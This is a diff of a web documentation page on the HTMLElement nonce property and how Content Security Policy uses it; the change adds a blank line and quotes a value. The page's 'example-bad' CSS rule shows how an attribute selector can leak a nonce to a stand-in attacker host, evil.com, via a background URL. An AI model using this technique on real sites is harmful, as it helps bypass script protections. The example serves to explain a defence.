@@ -12,6 +12,7 @@ tags:
   - nonce
 browser-compat: api.HTMLElement.nonce
 ---
+
 {{APIRef("HTML DOM")}}
 
 The **`nonce`** property of the {{DOMxRef("HTMLElement")}} interface returns the cryptographic number used once that is used by [Content Security Policy](/en-US/docs/Web/HTTP/CSP) to determine whether a given fetch will be allowed to proceed.
@@ -33,7 +34,7 @@ However, recent browsers version hide `nonce` values that are accessed this way 
 Nonce hiding helps prevent attackers from exfiltrating nonce data via mechanisms that can grab data from content attributes like this:
 
 ```css example-bad
-script[nonce~=whatever] {
+script[nonce~="whatever"] {
   background: url("https://evil.com/nonce?whatever");
 }
 ```
